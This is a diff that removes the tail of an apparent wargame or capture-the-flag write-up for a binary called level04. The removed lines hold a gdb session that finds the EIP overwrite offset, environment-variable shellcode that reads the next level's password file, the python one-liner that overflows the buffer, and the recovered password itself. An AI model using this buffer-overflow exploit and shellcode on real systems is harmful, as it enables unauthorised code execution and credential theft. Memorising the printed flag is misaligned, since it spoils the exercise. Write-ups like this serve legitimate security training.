@@ -75,26 +75,3 @@ Dump of assembler code for function main:
    0x08048824 <+348>:	pop    ebp
    0x08048825 <+349>:	ret
 End of assembler dump.
-
-gdb> pattern create 256
-gdb> r
-r
-[New process 2173]
-Give me some shellcode, k
-AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G
-
-Program received signal SIGSEGV, Segmentation fault.
-[Switching to process 2173]
-gdb> pattern search
-Registers contain pattern buffer:
-EIP+0 found at offset: 156
-
-$> export SHELLCODE=$(python -c "print '\x90' * 32 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'")
-gdb> x/s *((char**)environ)
-0xffffd8de:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061\311\061\322\353\062[\260\005\061\311̀\211\306\353\006\260\001\061\333̀\211\363\260\003\203\354\001\215\f$\262\001̀1\333\071\303t\346\260\004\263\001\262\001̀\203\304\001\353\337\350\311\377\377\377/home/users/level05/.pass"
-gdb> p 0xffffd8de + 10
-$1 = 0xffffd8e8
-$> python -c "print 'A' * 156 + '\xeb\xd8\xff\xff'" | ./level04
-Give me some shellcode, k
-3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
-child is exiting...
